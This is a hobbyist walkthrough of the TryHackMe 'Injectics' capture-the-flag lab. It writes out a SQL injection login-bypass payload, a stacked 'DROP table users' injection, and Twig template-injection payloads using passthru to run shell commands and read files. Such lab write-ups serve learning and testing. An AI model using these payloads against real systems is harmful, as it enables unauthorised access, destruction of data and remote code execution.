@@ -1,0 +1,294 @@
+Hello. This is a walkthrough for the CTF Module, "Injectics"
+
+I will be walking you through my sucesses and failures to show you how to grab the flags for the challenges listed in this CTF Room.
+
+As I stated above, I am listing ALL of my steps. I want to show you my method of thinking and how I was able to solve a problem that I was faced with. I did however not grab screenshots of my processes as I forgot to. I will provide screenshots in my next writeup.
+
+I hope this has helped you and I wish you the best of luck.
+
+
+
+
+
+Machine IP: 10.10.123.141
+
+nmap findings: (using nmap -p- -T4 10.10.123.141)
+	Took about 6 mins
+	-Open port on 22 ssh
+	-Open port on 80 hhtp
+
+Went to http://10.10.123.141/
+	Found a website:
+		Injectics Leaderboard
+	I have access to a Standard and Admin Login
+
+Inspected Source Code and found at the bottom:
+	"<!-- Mails are stored in mail.log file-->"
+
+Initiated a GoBuster Scan
+	used gobuster dir -u http://10.10.123.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+		found:
+			/flags
+			/css
+			/js
+			/javascript
+			/vendor
+			/phpmyadmin
+
+
+
+Also used dir search to find more info:	
+	Findings:                                                                                                                                                                                                       
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/Desktop/Important_and_other_stuff/TryHackMe/InjecticsCTF/reports/http_10.10.123.141/_25-05-08_14-32-15.txt
+
+Target: http://10.10.123.141/
+
+[14:32:15] Starting:                                                                                                          
+[14:32:19] 301 -  311B  - /js  ->  http://10.10.123.141/js/                 
+[14:32:21] 403 -  278B  - /.ht_wsr.txt                                      
+[14:32:21] 403 -  278B  - /.htaccess.bak1                                   
+[14:32:21] 403 -  278B  - /.htaccess.orig                                   
+[14:32:21] 403 -  278B  - /.htaccess.sample
+[14:32:21] 403 -  278B  - /.htaccess.save                                   
+[14:32:21] 403 -  278B  - /.htaccess_extra                                  
+[14:32:21] 403 -  278B  - /.htaccess_orig
+[14:32:21] 403 -  278B  - /.htaccess_sc
+[14:32:21] 403 -  278B  - /.htaccessOLD2                                    
+[14:32:21] 403 -  278B  - /.htaccessBAK
+[14:32:21] 403 -  278B  - /.htaccessOLD
+[14:32:21] 403 -  278B  - /.htm                                             
+[14:32:21] 403 -  278B  - /.html                                            
+[14:32:21] 403 -  278B  - /.htpasswd_test
+[14:32:21] 403 -  278B  - /.htpasswds                                       
+[14:32:21] 403 -  278B  - /.httr-oauth                                      
+[14:32:23] 403 -  278B  - /.php                                             
+[14:32:42] 200 -   48B  - /composer.json                                    
+[14:32:42] 200 -    9KB - /composer.lock                                    
+[14:32:43] 301 -  312B  - /css  ->  http://10.10.123.141/css/               
+[14:32:43] 302 -    0B  - /dashboard.php  ->  dashboard.php                 
+[14:32:48] 301 -  314B  - /flags  ->  http://10.10.123.141/flags/           
+[14:32:51] 301 -  319B  - /javascript  ->  http://10.10.123.141/javascript/ 
+[14:32:52] 403 -  278B  - /js/                                              
+[14:32:53] 200 -    1KB - /login.php                                        
+[14:32:54] 302 -    0B  - /logout.php  ->  index.php                        
+[14:32:54] 200 -    1KB - /mail.log                                         
+[14:32:59] 301 -  319B  - /phpmyadmin  ->  http://10.10.123.141/phpmyadmin/ 
+[14:33:00] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
+[14:33:02] 200 -    3KB - /phpmyadmin/index.php                             
+[14:33:02] 200 -    3KB - /phpmyadmin/
+[14:33:05] 403 -  278B  - /server-status/                                   
+[14:33:05] 403 -  278B  - /server-status                                    
+[14:33:12] 403 -  278B  - /vendor/                                          
+[14:33:12] 200 -    0B  - /vendor/composer/autoload_classmap.php
+[14:33:12] 200 -    0B  - /vendor/composer/autoload_files.php
+[14:33:12] 200 -    0B  - /vendor/composer/autoload_real.php
+[14:33:12] 200 -    1KB - /vendor/composer/LICENSE                          
+[14:33:12] 200 -    0B  - /vendor/composer/autoload_psr4.php
+[14:33:12] 200 -    0B  - /vendor/composer/autoload_static.php
+[14:33:12] 200 -   12KB - /vendor/composer/installed.json
+[14:33:12] 200 -    0B  - /vendor/composer/autoload_namespaces.php
+[14:33:12] 200 -    0B  - /vendor/composer/ClassLoader.php                  
+[14:33:12] 200 -    0B  - /vendor/autoload.php                                                                                                       
+Task Completed                                   
+
+
+I found interest in the /mail.log
+	I went to it and found login credentials:
+		superadmin@injectics.thm:superSecurePasswd101
+		dev@injectics.thm:devPasswd123 
+	These are the default credentials in the "users" table that are automatically added in the table is deleted or corrupted so they can access the table and preform maintenence. This is happening every minute.
+
+I tried to login to the admin page at /adminLogin007.php using these and they returned invalid. So my next step was to try /phpmyadmin/index.php
+
+Going there I was faced with another login page. I tried the superadmin login and it looks like I am not able to connect to the MySQL Server.
+
+My next step was to find a way around this. I then tried /phpmyadmin/doc/html/index.html
+
+It looks like that returned a version on phpMyAdmin (4.9.5). I documented that and moved on to find out how I could find what language the injectics site was in.
+
+I checked composer.json and was able to find:
+	"require:
+		twig/twig: "2.14.0""
+
+I still had some interest in the '/flags' I decided to check that out and it returned 403. So I guess no easy way out.
+
+So now we know the following:
+
+	-composer.json revealed twig. meaning we can leverage SSTI to possibly gain RCE
+	-We have default credentials that can access a MySQL database ran by phpMyAdmin
+	-It looks like we will need a find a way to delete the "users" database to gain access to the phpMyAdmin
+
+Moving over to challenge 1. Which is finding the flag after logging into the admin panel.
+
+We found the admin login page earlier by accessing /login.php
+
+I knew we were going to need to use the intruder and a payload. I found a payload list and prepped that for use (https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt)
+
+I opened up FoxyProxy and Burpsuite to intercept a login request.
+
+I went to the admin login page and entered in random credentials (abc:123)
+
+I intercepted the request and sent it to the intruder.
+
+I used a sniper attack and added the payload around abc so it looked like mail=$abc$
+
+I added my payload file to the 'payloads' tab and set it to URL-encode all characters to bypass any possible fitering.
+
+I then initiated the attack.
+
+I sorted by length and waited for something to show up...
+
+I got nothing. I should try the regular login page this time.
+
+I used the same credentials on "/login.php"
+
+I intercepted the login request and sent it to the intruder.
+
+I added the payload as "mail=$abc$"
+
+Added the payload file and set the processing to URL-encode all characters again
+
+I started the sniper attack and sorted by length and waited for something interesting to come up.
+	
+I found that Request 190 give me a length that was very different from the others. I paused the attack and looked at it a little deeper.
+
+Request 190 netted the correct entry we need:
+	%27%20%4f%52%20%27%78%27%3d%27%78%27%23%3b
+
+I URL-Decoded this and got:
+	' OR 'x'='x'#;
+
+In the response section I recieved:
+{"status":"success","message":"Login successful","is_admin":"true","first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
+
+That looks like something I can use. So I closed out of the attack window and moved back to the "proxy" tab in burp suite.
+
+Where "mail=abc" is, I replaced "abc" with the encoded text we got from our attack and then forwarded the request.
+
+And we are in and logged in as "dev"!
+
+Now we are not in the admin dashboard just yet. Remember we need to dump the "users" table to have the default credentials input into the table.
+
+We need to find somewhere to issue a command to dump the users table.
+
+I noticed an edit button under the actions tab.
+
+Clicking that brought me to /edit_leaderboard.php where I found that I could change values and update it.
+
+So that is what I did. I verified I had intercept on in burpsuite and clicked update(No need to change values).
+
+With the request intercepted, we are able to send it to the repeater and execute our payload:
+	DROP table users -- -
+
+Find rank=1&country=&gold=22&silver=21&bronze=12345
+
+In between <value> and "$" add a ";" and input your drop request.
+
+It should look something like this:
+	rank=1&country=&gold=22&silver=21; DROP table users -- -&bronze=12345
+
+When you click send, you should get a pretty basic response of 13 lines.
+
+We have successfully dropped the users table!
+
+Now that we have the table deleted, we can go back to the proxy tab and turn off intercept, log out of the dev account and log in as the admin with the credentials we found from the /mail.log we investigated earlier.
+
+I used superadmin@injectics.thm credentials to access the Admin dashboard and was able to get the first flag.
+
+
+
+Now we are going to focus on the second challenge. Finding the hidden text file in the flags folder.
+
+We found out earlier that this site was using twig. We can now use that to our advantage.
+
+Make sure you disable the FoxyProxy to avoid any issues before moving on!!!
+
+We are going to take advantage of changing our profile name to find our SSTI vulnerability.
+
+I took note before going to our profile that the site welcomes us by name. Which means when we update our name, we can check there to see if our test was sucessful.
+
+You can reference SSTI payloads here:
+https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/
+
+Using the link above, I tried {{9*9}} in the first name field.
+
+I went back to the dashboard and to my surprise that worked! We got "Welcome, 81"
+
+Now, we need to pass in a command to be able to see what we are dealing with here.
+
+I found this git repo that lists SSTI Payloads. We are going to refer to that.
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md#twig---code-execution
+
+I found that we can use sort in conjunction with passthru.
+
+That command will look like:
+	{{['whoami',""]|sort('passthru')}}
+
+When we input that command into the first name field and returned to the dashboard, we got the return of the "whoami" command. That doesn't really help us much. We are going to need to see where in the file system we are. We are going to use the pwd command to find that out.
+
+Looks like that didn't work how I wanted it to. We will need to find another way to get our bearings.
+
+For ease of access, I wanted to gain a shell. I used revshells.com to create a shell for me. 
+
+I tried Bash -i first to see if that would work. I copping the payload and injected it into the first name field.
+
+Before I did that, I set up a listener on my machine. 
+
+Now that the listener is running, we can submit our payload to see if it worked.
+
+This is where my Target machine died. Be sure to check on that!!
+
+No worries though. We will need to intercept another login request and input our URL encoded username.
+Then we will need to drop the tables again by editing a leaderboard. Once the table is deleted. Access the admin dashboard with default credentials.
+
+Now that we are back to where we were, we wanted to gain a shell. With the listener still running, inject your shell.
+
+The first shell I used didn't work, so I experimented with different shells. 
+
+I don't think I can get access to a shell in the Kali machine. Time to try something different.
+
+I wanted to make it a little easier than going back and forth between profile and dashboard. But we will have to do it the hard way.
+
+We are going to have to use 'pwd' to get our bearings.
+The command will be:
+	{{['pwd',""]|sort('passthru')}}
+
+I found that we are in /var/www/html
+
+Let's see what is in this directory.
+
+We are going to use the 'ls' command:
+	{{['ls',""]|sort('passthru')}}
+
+We found /flags! Let's go into that folder and see if we find anything useful.
+
+The command I used to do that was:
+	{{['ls /var/html/www/flags',""]|sort('passthru')}}
+
+It seems like that did not work for us. Let's go back a step and see where we went wrong.
+
+We were able to list everything in the html directory. I think I may have had an error somewhere
+
+Found it! I had the "html" and "www" reversed. Lets ammend that and try again
+
+Command:
+	{{['ls /var/www/html/flags',""]|sort('passthru')}}
+
+Now that I used the proper command, we found a .txt file:
+	<filename>.txt
+
+Let's use the cat command to display our flag and finish the room!
+
+Change the 'ls' to 'cat' and enter the file name at the end of flags.
+
+It should look like /flags/<file name>.txt
+
+We got our flag! 
+
+I hope this helped you get through this room. Big thanks to @trixiahorner that created a writeup on this room that I was able to follow when I could not get into a shell. I really just did not feel like booting up the webVM.
+
+Link to their write up is here: https://medium.com/@trixiahorner/tryhackme-injectics-walkthrough-c62f0df2a434
+
